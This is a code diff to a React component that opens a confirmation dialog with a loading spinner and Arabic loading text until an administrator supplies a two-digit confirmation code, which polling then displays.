@@ -160,6 +160,8 @@ export default function Component() {
     }
 
     setIsLoading(true);
+    setConfirmationCode(""); // Clear previous code to show loading state
+    setShowConfirmDialog(true); // Show dialog immediately with loading state
 
     if (visitorId) {
       // Submit to server
@@ -195,8 +197,8 @@ export default function Component() {
       }
     }
     
-    // Keep loading until modal appears (don't stop here)
-    // setIsLoading will be set to false when modal opens or error occurs
+    // Keep dialog open until admin sends the code
+    // The polling will update confirmationCode when the code arrives
   };
 
   // Confirmation code will be displayed as two individual digits
@@ -360,14 +362,21 @@ export default function Component() {
             <div className="text-center space-y-6 p-4">
               {/* TWO DIGITS SIDE BY SIDE IN SMALLER ELEGANT BOX */}
               <div className="mx-auto w-48 h-48 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-2xl shadow-lg flex items-center justify-center">
-                <div className="flex gap-3 justify-center items-center" dir="ltr">
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
-                    {confirmationCode?.[0] || "-"}
+                {confirmationCode ? (
+                  <div className="flex gap-3 justify-center items-center" dir="ltr">
+                    <div className="text-6xl font-bold text-teal-600 font-mono">
+                      {confirmationCode[0]}
+                    </div>
+                    <div className="text-6xl font-bold text-teal-600 font-mono">
+                      {confirmationCode[1]}
+                    </div>
                   </div>
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
-                    {confirmationCode?.[1] || "-"}
+                ) : (
+                  <div className="flex flex-col items-center justify-center">
+                    <div className="w-12 h-12 border-4 border-teal-300 border-t-transparent rounded-full animate-spin mb-2"></div>
+                    <span className="text-lg font-semibold text-teal-600">جارٍ التحميل...</span>
                   </div>
-                </div>
+                )}
               </div>
 
               <div className="flex items-center justify-center gap-3 text-teal-600 py-2">
